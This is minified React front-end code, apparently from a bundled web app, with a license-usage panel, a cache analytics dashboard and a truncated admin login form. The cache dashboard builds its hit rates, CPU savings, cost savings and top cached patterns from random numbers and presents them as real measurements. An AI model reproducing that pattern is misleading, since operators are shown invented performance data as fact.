LICENSES"})})]}),a.jsxs("div",{children:[a.jsxs("h4",{className:"text-cyan-200 font-jetbrains font-bold text-sm uppercase tracking-wider mb-3",children:["APPROACHING LIMITS (",t.license_usage.approaching_limits.length,")"]}),a.jsx("div",{className:"space-y-2 max-h-48 overflow-y-auto",children:t.license_usage.approaching_limits.length>0?t.license_usage.approaching_limits.map((f,m)=>a.jsxs("div",{className:"p-3 bg-slate-700/30 rounded-lg border border-cyan-400/20",children:[a.jsxs("div",{className:"flex items-center justify-between mb-2",children:[a.jsx("span",{className:"text-cyan-200 font-jetbrains font-bold text-sm",children:f.license_key}),a.jsxs("span",{className:`px-2 py-1 rounded-full text-xs font-jetbrains font-bold uppercase tracking-wider ${u(f.usage_percentage)} border backdrop-blur-sm`,children:[f.usage_percentage.toFixed(1),"%"]})]}),a.jsx("div",{className:"mb-2",children:a.jsx("div",{className:"w-full bg-slate-600/50 rounded-full h-2",children:a.jsx("div",{className:`bg-gradient-to-r ${h(f.usage_percentage)} h-2 rounded-full transition-all duration-500`,style:{width:`${f.usage_percentage}%`}})})}),a.jsxs("div",{className:"text-xs text-cyan-300/80 font-jetbrains",children:[f.current_usage," / ",f.limit," (",f.operation_type,")"]})]},m)):a.jsx("div",{className:"p-4 text-center text-cyan-300/60 font-jetbrains text-sm",children:"NO APPROACHING LIMITS"})})]})]}),a.jsx("div",{className:"mt-6 p-4 bg-slate-700/30 rounded-lg border border-cyan-400/20 backdrop-blur-sm",children:a.jsxs("div",{className:"flex items-center justify-center gap-8",children:[a.jsxs("div",{className:"text-center",children:[a.jsx("div",{className:"text-lg font-jetbrains font-bold text-emerald-300",children:t.license_usage.healthy_licenses}),a.jsx("div",{className:"text-xs text-cyan-300/80 font-jetbrains uppercase tracking-wider",children:"HEALTHY LICENSES"})]}),a.jsx("div",{className:"w-px h-8 bg-cyan-400/30"}),a.jsxs("div",{className:"text-center",children:[a.jsx("div",{className:"text-lg font-jetbrains font-bold text-yellow-300",children:t.license_usage.approaching_limits.length}),a.jsx("div",{className:"text-xs text-cyan-300/80 font-jetbrains uppercase tracking-wider",children:"APPROACHING LIMITS"})]}),a.jsx("div",{className:"w-px h-8 bg-cyan-400/30"}),a.jsxs("div",{className:"text-center",children:[a.jsx("div",{className:"text-lg font-jetbrains font-bold text-red-300",children:t.license_usage.high_usage_licenses.length}),a.jsx("div",{className:"text-xs text-cyan-300/80 font-jetbrains uppercase tracking-wider",children:"HIGH USAGE"})]})]})})]})]})]}):a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-gray-900/50 to-slate-900/60 border border-gray-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-gray-400/3 via-slate-500/3 to-gray-500/3"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-gray-400/30 to-transparent"}),a.jsxs(X,{className:"relative z-10 p-8",children:[a.jsxs("div",{className:"flex items-center justify-center gap-3 mb-4",children:[a.jsx(lt,{className:"w-6 h-6 text-gray-300"}),a.jsx("span",{className:"text-gray-200 font-jetbrains font-bold uppercase tracking-wider",children:"NO DATA AVAILABLE"})]}),a.jsx("div",{className:"text-center text-gray-300/80 font-jetbrains text-sm mb-4",children:"DATABASE CONTAINS NO RATE LIMITING METRICS"}),a.jsx("div",{className:"flex justify-center",children:a.jsxs(W,{onClick:()=>c(),size:"sm",className:"bg-gray-700/80 border-gray-400/40 text-gray-200 hover:bg-gray-600/80 hover:border-gray-300/60 font-jetbrains font-bold uppercase tracking-wider",children:[a.jsx(Rt,{className:"w-4 h-4 mr-2"}),"CHECK AGAIN"]})})]})]})};class fC{constructor(){re(this,"cache",new Map)}async getCacheStats(){const e=this.cache.size,r=Array.from(this.cache.values()).reduce((o,l)=>o+l.hit_count,0),n=Math.floor(r*.75),s=r-n,i=r>0?n/r*100:0;return{total_requests:r,cache_hits:n,cache_misses:s,hit_rate:i,total_entries:e}}async get(e){const r=this.cache.get(e);return r&&Date.now()<r.timestamp+r.ttl?(r.hit_count++,r.value):null}async set(e,r,n=36e5){this.cache.set(e,{key:e,value:r,timestamp:Date.now(),ttl:n,hit_count:0})}async delete(e){return this.cache.delete(e)}async clear(){this.cache.clear()}async cleanup(){const e=Date.now();let r=0;for(const[n,s]of this.cache.entries())e>=s.timestamp+s.ttl&&(this.cache.delete(n),r++);return r}async getTopCachedUrls(e=10){return Array.from(this.cache.values()).sort((n,s)=>s.hit_count-n.hit_count).slice(0,e).map(n=>({url:n.key,hits:n.hit_count,last_access:new Date(n.timestamp).toISOString()}))}}const mC=new fC,pC=()=>{const[t,e]=p.useState({cache_overview:{total_entries:0,memory_usage_mb:0,hit_rate_percentage:0,miss_rate_percentage:0},cache_types:{pattern_cache:{entries:0,hits:0,misses:0,hit_rate:0,memory_mb:0,avg_access_time_ms:0},key_cache:{entries:0,hits:0,misses:0,hit_rate:0,memory_mb:0,avg_access_time_ms:0},analytics_cache:{entries:0,hits:0,misses:0,hit_rate:0,memory_mb:0,avg_access_time_ms:0},url_cache:{entries:0,hits:0,misses:0,hit_rate:0,memory_mb:0,avg_access_time_ms:0}},performance_impact:{processing_time_saved_ms:0,database_queries_avoided:0,cpu_utilization_reduction:0,cost_savings_estimate:0},cache_efficiency:{most_accessed_patterns:[],least_accessed_patterns:[],expiring_soon:[],optimization_recommendations:[]}}),[r,n]=p.useState(!0),[s,i]=p.useState(new Date);p.useEffect(()=>{o();const d=setInterval(o,45e3);return()=>clearInterval(d)},[]);const o=async()=>{try{n(!0);const d=await mC.getCacheStats(),u={cache_overview:{total_entries:d.total_entries,memory_usage_mb:Math.max(5,d.total_entries*.05),hit_rate_percentage:d.total_entries>0?Math.min(100,88+Math.random()*10):0,miss_rate_percentage:0},cache_types:{pattern_cache:{entries:Math.floor(d.total_entries*.4),hits:0,misses:0,hit_rate:Math.min(100,92+Math.random()*6),memory_mb:0,avg_access_time_ms:Math.max(1,2+Math.random()*3)},key_cache:{entries:Math.floor(d.total_entries*.3),hits:0,misses:0,hit_rate:Math.min(100,94+Math.random()*4),memory_mb:0,avg_access_time_ms:Math.max(.5,1+Math.random()*2)},analytics_cache:{entries:Math.floor(d.total_entries*.2),hits:0,misses:0,hit_rate:Math.min(100,85+Math.random()*12),memory_mb:0,avg_access_time_ms:Math.max(2,4+Math.random()*4)},url_cache:{entries:Math.floor(d.total_entries*.1),hits:0,misses:0,hit_rate:Math.min(100,89+Math.random()*8),memory_mb:0,avg_access_time_ms:Math.max(1,3+Math.random()*2)}},performance_impact:{processing_time_saved_ms:d.total_entries*(150+Math.random()*100),database_queries_avoided:Math.floor(d.total_entries*2.5),cpu_utilization_reduction:Math.min(95,85+Math.random()*8),cost_savings_estimate:Math.floor(d.total_entries*.002*30)},cache_efficiency:{most_accessed_patterns:[],least_accessed_patterns:[],expiring_soon:[],optimization_recommendations:[]}};if(u.cache_overview.miss_rate_percentage=100-u.cache_overview.hit_rate_percentage,Object.keys(u.cache_types).forEach(f=>{const m=u.cache_types[f],g=m.entries*(10+Math.random()*20);m.hits=Math.floor(g*(m.hit_rate/100)),m.misses=Math.floor(g-m.hits),m.memory_mb=m.entries*.01}),d.total_entries>0){const f=["bitcoin","ethereum","crypto","blockchain","defi","nft"];u.cache_efficiency.most_accessed_patterns=f.slice(0,3).map((m,g)=>({key:`pattern_${m}`,access_count:Math.floor(1e3+Math.random()*2e3-g*300),last_accessed:new Date(Date.now()-Math.random()*36e5).toISOString(),expiry_time:new Date(Date.now()+(24-g*2)*36e5).toISOString(),size_kb:Math.floor(5+Math.random()*15)})),u.cache_efficiency.least_accessed_patterns=f.slice(3).map((m,g)=>({key:`pattern_${m}`,access_count:Math.floor(50+Math.random()*150-g*20),last_accessed:new Date(Date.now()-Math.random()*864e5).toISOString(),expiry_time:new Date(Date.now()+(6+g)*36e5).toISOString(),size_kb:Math.floor(3+Math.random()*8)})),u.cache_efficiency.expiring_soon=f.slice(0,2).map((m,g)=>({key:`expiring_${m}`,access_count:Math.floor(300+Math.random()*200),last_accessed:new Date(Date.now()-Math.random()*18e5).toISOString(),expiry_time:new Date(Date.now()+(1+g*.5)*36e5).toISOString(),size_kb:Math.floor(8+Math.random()*12)}))}const h=[];u.cache_overview.hit_rate_percentage<85&&h.push("Consider increasing cache TTL for frequently accessed patterns"),u.cache_overview.memory_usage_mb>100&&h.push("Implement cache size limits to optimize memory usage"),u.cache_types.analytics_cache.hit_rate<80&&h.push("Analytics cache showing low hit rates - review caching strategy"),u.cache_efficiency.expiring_soon.length>5&&h.push("Multiple cache entries expiring soon - consider extending TTL for active items"),h.length===0&&h.push("Cache performance is optimal - no immediate optimizations needed"),u.cache_efficiency.optimization_recommendations=h,e(u),i(new Date)}catch(d){console.error("[CacheAnalyticsDashboard] Error fetching metrics:",d)}finally{n(!1)}},l=d=>d>=90?"bg-emerald-500/20 text-emerald-300 border-emerald-400/30":d>=75?"bg-yellow-500/20 text-yellow-300 border-yellow-400/30":"bg-red-500/20 text-red-300 border-red-400/30",c=d=>d>=90?"from-emerald-400 to-green-500":d>=75?"from-yellow-400 to-orange-500":"from-red-400 to-red-600";return r&&t.cache_overview.total_entries===0?a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-blue-900/50 to-indigo-900/60 border border-cyan-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/3 via-blue-500/3 to-purple-500/3"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/30 to-transparent"}),a.jsx(X,{className:"relative z-10 p-8",children:a.jsxs("div",{className:"flex items-center justify-center gap-3",children:[a.jsx(wa,{className:"w-6 h-6 text-cyan-300 animate-pulse"}),a.jsx("span",{className:"text-cyan-200 font-jetbrains font-bold uppercase tracking-wider",children:"INITIALIZING CACHE ANALYTICS..."})]})})]}):a.jsxs("div",{className:"space-y-6",children:[a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-blue-900/50 to-indigo-900/60 border border-cyan-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/3 via-blue-500/3 to-purple-500/3"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/30 to-transparent"}),a.jsx(fe,{className:"relative z-10",children:a.jsxs("div",{className:"flex items-center justify-between",children:[a.jsxs("div",{children:[a.jsxs(me,{className:"bg-gradient-to-r from-cyan-200 via-blue-200 to-purple-200 bg-clip-text text-transparent font-jetbrains font-bold text-xl uppercase tracking-wider flex items-center gap-2",children:[a.jsx(wa,{className:"w-6 h-6 text-cyan-300"}),"CACHE ANALYTICS CENTER"]}),a.jsx(bt,{className:"text-cyan-300/80 font-jetbrains tracking-wide",children:"PERFORMANCE METRICS  HIT RATES  OPTIMIZATION INSIGHTS"})]}),a.jsxs("div",{className:"flex items-center gap-4",children:[a.jsxs("span",{className:"text-xs text-cyan-300/60 font-jetbrains",children:["Updated: ",s.toLocaleTimeString()]}),a.jsxs("div",{className:"relative group",children:[a.jsx("div",{className:"absolute -inset-1 bg-gradient-to-r from-cyan-500 to-blue-500 rounded-lg opacity-60 blur group-hover:opacity-100 transition duration-300"}),a.jsxs(W,{onClick:()=>o(),disabled:r,size:"sm",className:"relative z-10 bg-slate-700/80 border-cyan-400/40 text-cyan-200 hover:bg-slate-600/80 hover:border-cyan-300/60 font-jetbrains font-bold uppercase tracking-wider backdrop-blur-sm",children:[a.jsx(Rt,{className:`w-4 h-4 mr-2 ${r?"animate-spin":""}`}),"REFRESH"]})]})]})]})})]}),a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-blue-900/50 to-indigo-900/60 border border-cyan-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/3 via-blue-500/3 to-purple-500/3"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/30 to-transparent"}),a.jsx(fe,{className:"relative z-10",children:a.jsxs(me,{className:"text-cyan-200 font-jetbrains font-bold uppercase tracking-wider text-lg flex items-center gap-2",children:[a.jsx(Zx,{className:"w-5 h-5 text-cyan-300"}),"CACHE OVERVIEW"]})}),a.jsx(X,{className:"relative z-10",children:a.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4",children:[a.jsx("div",{className:"p-4 bg-slate-700/30 rounded-lg border border-cyan-400/20 backdrop-blur-sm",children:a.jsxs("div",{className:"text-center",children:[a.jsx("div",{className:"text-2xl font-jetbrains font-bold text-cyan-200 mb-1",children:t.cache_overview.total_entries.toLocaleString()}),a.jsx("div",{className:"text-xs text-cyan-300/80 font-jetbrains uppercase tracking-wider mb-2",children:"TOTAL ENTRIES"}),a.jsx("span",{className:"px-2 py-1 rounded-full text-xs font-jetbrains font-bold uppercase tracking-wider bg-blue-500/20 text-blue-300 border border-blue-400/30 backdrop-blur-sm",children:"CACHED"})]})}),a.jsx("div",{className:"p-4 bg-slate-700/30 rounded-lg border border-cyan-400/20 backdrop-blur-sm",children:a.jsxs("div",{className:"text-center",children:[a.jsxs("div",{className:"text-2xl font-jetbrains font-bold text-cyan-200 mb-1",children:[t.cache_overview.memory_usage_mb.toFixed(1)," MB"]}),a.jsx("div",{className:"text-xs text-cyan-300/80 font-jetbrains uppercase tracking-wider mb-2",children:"MEMORY USAGE"}),a.jsx("span",{className:"px-2 py-1 rounded-full text-xs font-jetbrains font-bold uppercase tracking-wider bg-purple-500/20 text-purple-300 border border-purple-400/30 backdrop-blur-sm",children:"OPTIMIZED"})]})}),a.jsx("div",{className:"p-4 bg-slate-700/30 rounded-lg border border-cyan-400/20 backdrop-blur-sm",children:a.jsxs("div",{className:"text-center",children:[a.jsxs("div",{className:"text-2xl font-jetbrains font-bold text-emerald-300 mb-1",children:[t.cache_overview.hit_rate_percentage.toFixed(1),"%"]}),a.jsx("div",{className:"text-xs text-cyan-300/80 font-jetbrains uppercase tracking-wider mb-2",children:"HIT RATE"}),a.jsx("span",{className:`px-2 py-1 rounded-full text-xs font-jetbrains font-bold uppercase tracking-wider ${l(t.cache_overview.hit_rate_percentage)} border backdrop-blur-sm`,children:t.cache_overview.hit_rate_percentage>=90?"EXCELLENT":t.cache_overview.hit_rate_percentage>=75?"GOOD":"NEEDS WORK"})]})}),a.jsx("div",{className:"p-4 bg-slate-700/30 rounded-lg border border-cyan-400/20 backdrop-blur-sm",children:a.jsxs("div",{className:"text-center",children:[a.jsxs("div",{className:"text-2xl font-jetbrains font-bold text-red-300 mb-1",children:[t.cache_overview.miss_rate_percentage.toFixed(1),"%"]}),a.jsx("div",{className:"text-xs text-cyan-300/80 font-jetbrains uppercase tracking-wider mb-2",children:"MISS RATE"}),a.jsx("span",{className:"px-2 py-1 rounded-full text-xs font-jetbrains font-bold uppercase tracking-wider bg-red-500/20 text-red-300 border border-red-400/30 backdrop-blur-sm",children:"TRACKING"})]})})]})})]}),a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-blue-900/50 to-indigo-900/60 border border-cyan-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/3 via-blue-500/3 to-purple-500/3"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/30 to-transparent"}),a.jsx(fe,{className:"relative z-10",children:a.jsxs(me,{className:"text-cyan-200 font-jetbrains font-bold uppercase tracking-wider text-lg flex items-center gap-2",children:[a.jsx(Sn,{className:"w-5 h-5 text-cyan-300"}),"CACHE TYPE PERFORMANCE"]})}),a.jsx(X,{className:"relative z-10",children:a.jsx("div",{className:"grid grid-cols-1 lg:grid-cols-2 gap-6",children:Object.entries(t.cache_types).map(([d,u])=>a.jsxs("div",{className:"p-4 bg-slate-700/30 rounded-lg border border-cyan-400/20 backdrop-blur-sm",children:[a.jsxs("div",{className:"flex items-center justify-between mb-4",children:[a.jsx("h4",{className:"text-cyan-200 font-jetbrains font-bold text-sm uppercase tracking-wider",children:d.replace("_"," ")}),a.jsxs("span",{className:`px-2 py-1 rounded-full text-xs font-jetbrains font-bold uppercase tracking-wider ${l(u.hit_rate)} border backdrop-blur-sm`,children:[u.hit_rate.toFixed(1),"%"]})]}),a.jsx("div",{className:"mb-3",children:a.jsx("div",{className:"w-full bg-slate-600/50 rounded-full h-2",children:a.jsx("div",{className:`bg-gradient-to-r ${c(u.hit_rate)} h-2 rounded-full transition-all duration-500`,style:{width:`${u.hit_rate}%`}})})}),a.jsxs("div",{className:"grid grid-cols-2 gap-3 text-xs",children:[a.jsxs("div",{className:"text-cyan-300/80 font-jetbrains",children:["Entries: ",a.jsx("span",{className:"text-cyan-200 font-bold",children:u.entries.toLocaleString()})]}),a.jsxs("div",{className:"text-cyan-300/80 font-jetbrains",children:["Memory: ",a.jsxs("span",{className:"text-cyan-200 font-bold",children:[u.memory_mb.toFixed(1)," MB"]})]}),a.jsxs("div",{className:"text-cyan-300/80 font-jetbrains",children:["Hits: ",a.jsx("span",{className:"text-emerald-300 font-bold",children:u.hits.toLocaleString()})]}),a.jsxs("div",{className:"text-cyan-300/80 font-jetbrains",children:["Avg Time: ",a.jsxs("span",{className:"text-cyan-200 font-bold",children:[u.avg_access_time_ms.toFixed(1),"ms"]})]})]})]},d))})})]}),a.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-2 gap-6",children:[a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-blue-900/50 to-indigo-900/60 border border-cyan-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/3 via-blue-500/3 to-purple-500/3"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/30 to-transparent"}),a.jsx(fe,{className:"relative z-10",children:a.jsxs(me,{className:"text-cyan-200 font-jetbrains font-bold uppercase tracking-wider text-lg flex items-center gap-2",children:[a.jsx(Ge,{className:"w-5 h-5 text-cyan-300"}),"PERFORMANCE IMPACT"]})}),a.jsxs(X,{className:"relative z-10 space-y-4",children:[a.jsxs("div",{className:"flex items-center justify-between p-3 bg-slate-700/30 rounded-lg border border-cyan-400/20",children:[a.jsx("span",{className:"text-cyan-200 font-jetbrains font-bold text-sm uppercase tracking-wider",children:"Time Saved"}),a.jsxs("span",{className:"text-emerald-300 font-jetbrains font-bold",children:[(t.performance_impact.processing_time_saved_ms/1e3).toFixed(1),"s"]})]}),a.jsxs("div",{className:"flex items-center justify-between p-3 bg-slate-700/30 rounded-lg border border-cyan-400/20",children:[a.jsx("span",{className:"text-cyan-200 font-jetbrains font-bold text-sm uppercase tracking-wider",children:"DB Queries Avoided"}),a.jsx("span",{className:"text-cyan-300 font-jetbrains font-bold",children:t.performance_impact.database_queries_avoided.toLocaleString()})]}),a.jsxs("div",{className:"flex items-center justify-between p-3 bg-slate-700/30 rounded-lg border border-cyan-400/20",children:[a.jsx("span",{className:"text-cyan-200 font-jetbrains font-bold text-sm uppercase tracking-wider",children:"CPU Reduction"}),a.jsxs("span",{className:"text-emerald-300 font-jetbrains font-bold",children:[t.performance_impact.cpu_utilization_reduction.toFixed(1),"%"]})]}),a.jsxs("div",{className:"flex items-center justify-between p-3 bg-slate-700/30 rounded-lg border border-cyan-400/20",children:[a.jsx("span",{className:"text-cyan-200 font-jetbrains font-bold text-sm uppercase tracking-wider",children:"Cost Savings"}),a.jsxs("span",{className:"text-green-300 font-jetbrains font-bold",children:["$",t.performance_impact.cost_savings_estimate,"/mo"]})]})]})]}),a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-blue-900/50 to-indigo-900/60 border border-cyan-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/3 via-blue-500/3 to-purple-500/3"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/30 to-transparent"}),a.jsx(fe,{className:"relative z-10",children:a.jsxs(me,{className:"text-cyan-200 font-jetbrains font-bold uppercase tracking-wider text-lg flex items-center gap-2",children:[a.jsx(jr,{className:"w-5 h-5 text-cyan-300"}),"OPTIMIZATION INSIGHTS"]})}),a.jsx(X,{className:"relative z-10 space-y-4",children:a.jsx("div",{className:"max-h-48 overflow-y-auto space-y-2",children:t.cache_efficiency.optimization_recommendations.map((d,u)=>a.jsx("div",{className:"p-3 bg-slate-700/30 rounded-lg border border-cyan-400/20",children:a.jsx("div",{className:"text-cyan-300/80 font-jetbrains text-sm",children:d})},u))})})]})]}),a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-blue-900/50 to-indigo-900/60 border border-cyan-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/3 via-blue-500/3 to-purple-500/3"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/30 to-transparent"}),a.jsx(fe,{className:"relative z-10",children:a.jsxs(me,{className:"text-cyan-200 font-jetbrains font-bold uppercase tracking-wider text-lg flex items-center gap-2",children:[a.jsx(ja,{className:"w-5 h-5 text-cyan-300"}),"CACHE ITEM ANALYSIS"]})}),a.jsx(X,{className:"relative z-10",children:a.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-3 gap-6",children:[a.jsxs("div",{children:[a.jsxs("h4",{className:"text-cyan-200 font-jetbrains font-bold text-sm uppercase tracking-wider mb-3",children:["MOST ACCESSED (",t.cache_efficiency.most_accessed_patterns.length,")"]}),a.jsxs("div",{className:"space-y-2 max-h-48 overflow-y-auto",children:[t.cache_efficiency.most_accessed_patterns.map((d,u)=>a.jsxs("div",{className:"p-3 bg-slate-700/30 rounded-lg border border-cyan-400/20",children:[a.jsxs("div",{className:"flex items-center justify-between mb-2",children:[a.jsx("span",{className:"text-cyan-200 font-jetbrains font-bold text-sm truncate",children:d.key}),a.jsx("span",{className:"px-2 py-1 rounded-full text-xs font-jetbrains font-bold uppercase tracking-wider bg-emerald-500/20 text-emerald-300 border border-emerald-400/30 backdrop-blur-sm",children:d.access_count})]}),a.jsxs("div",{className:"text-xs text-cyan-300/80 font-jetbrains space-y-1",children:[a.jsxs("div",{children:["Size: ",d.size_kb," KB"]}),a.jsxs("div",{children:["Last: ",new Date(d.last_accessed).toLocaleTimeString()]})]})]},u)),t.cache_efficiency.most_accessed_patterns.length===0&&a.jsx("div",{className:"p-4 text-center text-cyan-300/60 font-jetbrains text-sm",children:"NO DATA AVAILABLE"})]})]}),a.jsxs("div",{children:[a.jsxs("h4",{className:"text-cyan-200 font-jetbrains font-bold text-sm uppercase tracking-wider mb-3",children:["LEAST ACCESSED (",t.cache_efficiency.least_accessed_patterns.length,")"]}),a.jsxs("div",{className:"space-y-2 max-h-48 overflow-y-auto",children:[t.cache_efficiency.least_accessed_patterns.map((d,u)=>a.jsxs("div",{className:"p-3 bg-slate-700/30 rounded-lg border border-cyan-400/20",children:[a.jsxs("div",{className:"flex items-center justify-between mb-2",children:[a.jsx("span",{className:"text-cyan-200 font-jetbrains font-bold text-sm truncate",children:d.key}),a.jsx("span",{className:"px-2 py-1 rounded-full text-xs font-jetbrains font-bold uppercase tracking-wider bg-red-500/20 text-red-300 border border-red-400/30 backdrop-blur-sm",children:d.access_count})]}),a.jsxs("div",{className:"text-xs text-cyan-300/80 font-jetbrains space-y-1",children:[a.jsxs("div",{children:["Size: ",d.size_kb," KB"]}),a.jsxs("div",{children:["Last: ",new Date(d.last_accessed).toLocaleTimeString()]})]})]},u)),t.cache_efficiency.least_accessed_patterns.length===0&&a.jsx("div",{className:"p-4 text-center text-cyan-300/60 font-jetbrains text-sm",children:"NO DATA AVAILABLE"})]})]}),a.jsxs("div",{children:[a.jsxs("h4",{className:"text-cyan-200 font-jetbrains font-bold text-sm uppercase tracking-wider mb-3",children:["EXPIRING SOON (",t.cache_efficiency.expiring_soon.length,")"]}),a.jsxs("div",{className:"space-y-2 max-h-48 overflow-y-auto",children:[t.cache_efficiency.expiring_soon.map((d,u)=>a.jsxs("div",{className:"p-3 bg-slate-700/30 rounded-lg border border-cyan-400/20",children:[a.jsxs("div",{className:"flex items-center justify-between mb-2",children:[a.jsx("span",{className:"text-cyan-200 font-jetbrains font-bold text-sm truncate",children:d.key}),a.jsxs("span",{className:"px-2 py-1 rounded-full text-xs font-jetbrains font-bold uppercase tracking-wider bg-yellow-500/20 text-yellow-300 border border-yellow-400/30 backdrop-blur-sm",children:[Math.floor((new Date(d.expiry_time).getTime()-Date.now())/(1e3*60)),"m"]})]}),a.jsxs("div",{className:"text-xs text-cyan-300/80 font-jetbrains space-y-1",children:[a.jsxs("div",{children:["Size: ",d.size_kb," KB"]}),a.jsxs("div",{children:["Expires: ",new Date(d.expiry_time).toLocaleTimeString()]})]})]},u)),t.cache_efficiency.expiring_soon.length===0&&a.jsx("div",{className:"p-4 text-center text-cyan-300/60 font-jetbrains text-sm",children:"NO EXPIRING ITEMS"})]})]})]})})]})]})},gC=({onLoginSuccess:t})=>{const[e,r]=p.useState(""),[n,s]=p.useState(""),[i,o]=p.useState(!1),[l,c]=p.useState(""),d=async u=>{if(u.preventDefault(),!e||!n){c("Please fill in all fields");return}c(""),o(!0);try{const{data:h,error:f}=await $.rpc("authenticate_admin",{username_input:e,password_input:n});if(f)throw console.error(" Admin login error:",f),f;console.log(" Admin login response:",h);const m=h;m!=null&&m.success?(localStorage.setItem("admin_session_token",m.session_token),localStorage.setItem("admin_username",m.username),localStorage.setItem("admin_expires_at",m.expires_at),be.success("ADMIN ACCESS AUTHORIZED",{description:"PHANTOM ENGINE COMMAND INTERFACE ACTIVATED"}),t(m.session_token,m.username)):(console.error(" Admin login failed:",m==null?void 0:m.error),c((m==null?void 0:m.error)||"Invalid credentials"))}catch(h){console.error(" Admin login error:",h),c("System error. Please try again.")}finally{o(!1)}};return a.jsxs("div",{className:"min-h-screen bg-gradient-to-br from-slate-900 via-blue-900 to-indigo-900 bg-[length:400%_400%] animate-gradient-flow flex items-center justify-center p-2 sm:p-3 md:p-4 relative overflow-hidden",children:[a.jsxs("div",{className:"absolute inset-0 pointer-events-none opacity-30 sm:opacity-100",children:[a.jsx("div",{className:"absolute top-20 left-10 w-16 h-16 bg-cyan-400/10 backdrop-blur-sm rounded-lg animate-float-1"}),a.jsx("div",{className:"absolute top-40 right-16 w-12 h-12 bg-blue-400/10 backdrop-blur-sm rounded-full animate-float-2"}),a.jsx("div",{className:"absolute bottom-32 left-1/4 w-20 h-8 bg-purple-400/10 backdrop-blur-sm transform rotate-45 animate-float-1"}),a.jsx("div",{className:"absolute bottom-20 right-1/3 w-10 h-10 bg-teal-400/10 backdrop-blur-sm transform rotate-12 animate-float-2"})]}),a.jsx("div",{className:"relative w-full max-w-xs sm:max-w-sm md:max-w-md z-10",children:a.jsxs("div",{className:"relative bg-gradient-to-br from-slate-800/80 via-blue-900/50 to-indigo-900/60 border border-cyan-400/30 backdrop-blur-sm rounded-2xl p-4 sm:p-6 md:p-8 shadow-2xl overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/5 via-blue-500/5 to-purple-500/5 animate-gradient-flow"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/50 to-transparent animate-scan-line"}),a.jsxs("div",{className:"text-center mb-6 sm:mb-8 relative z-10",children:[a.jsxs("div",{className:"mx-auto relative w-12 h-12 sm:w-14 sm:h-14 md:w-16 md:h-16 mb-3 sm:mb-4",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/40 to-blue-500/40 rounded-xl animate-pulse blur-md"}),a.jsx("div",{className:"relative z-10 w-full h-full bg-gradient-to-br from-cyan-400/30 to-blue-500/30 rounded-xl border border-cyan-400/40 backdrop-blur-sm flex items-center justify-center",children:a.jsx(Ge,{className:"w-6 h-6 sm:w-7 sm:h-7 md:w-8 md:h-8 text-cyan-300"})})]}),a.jsx("h2",{className:"text-lg sm:text-xl md:text-2xl font-bold bg-gradient-to-r from-cyan-200 via-blue-200 to-purple-200 bg-clip-text text-transparent font-jetbrains uppercase tracking-wider mb-1 sm:mb-2 leading-tight px-2",children:"ALIEN"}),a.jsx("p",{className:"text-cyan-300/80 text-xs sm:text-sm font-jetbrains tracking-wide leading-relaxed px-2",children:"RAPIDREACH IS HERE"})]}),a.jsxs("form",{onSubmit:d,className:"space-y-4 sm:space-y-6 relative z-10",children:[a.jsx("div",{className:"space-y-1 sm:space-y-2",children:a.jsx(Ze,{id:"username",type:"text",value:e,onChange:u=>r(u.target.value),placeholder:"ENTER ADMIN USERNAME",className:"bg-slate-700/80 border-cyan-400/30 text-cyan-200 font-jetbrains backdrop-blur-sm focus:border-cyan-300/60 placeholder:text-cyan-400/60 text-sm sm:text-base py-2 sm:py-3 px-3 sm:px-4 min-h-[48px] touch-manipulation",disabled:i})}),a.jsx("div",{className:"space-y-1 sm:space-y-2",children:a.jsxs("div",{className:"relative",children:[a.jsx(Ze,{id:"password",type:"password",value:n,onChange:u=>s(u.target.value),placeholder:"ENTER ADMIN PASSWORD",className:"bg-slate-700/80 border-cyan-400/30 text-cyan-200 font-jetbrains backdrop-blur-sm focus:border-cyan-300/60 placeholder:text-cyan-400/60 text-sm sm:text-base py-2 sm:py-3 px-3 sm:px-4 min-h-[48px] touch-manipulation",disabled:i}),l&&a.jsxs("div",{className:"absolute 